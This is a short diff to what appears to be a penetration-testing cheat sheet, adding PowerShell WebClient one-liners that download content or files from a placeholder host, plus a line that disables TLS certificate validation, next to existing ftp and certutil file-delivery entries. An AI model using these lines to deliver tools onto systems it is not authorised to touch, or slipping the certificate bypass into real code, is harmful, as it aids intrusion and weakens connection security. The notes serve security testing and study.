@@ -416,6 +416,12 @@ $ ftp -v -n -s:ftp.txt
 
 # Certutil ???
 http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
+
+# Powershell
+(new-object System.Net.WebClient).DownloadString("http://www.mysite.com") # replicate Curl
+(new-object System.Net.WebClient).DownloadData("http://www.mysite.com")   # replicate Curl
+(new-object System.Net.WebClient).DownloadFile("http://www.mysite.com", 'C:\Temp\file') # replicate Wget
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; # ignore SSL warnings (add to lines above)
 ```
 
 Vulnerable services:
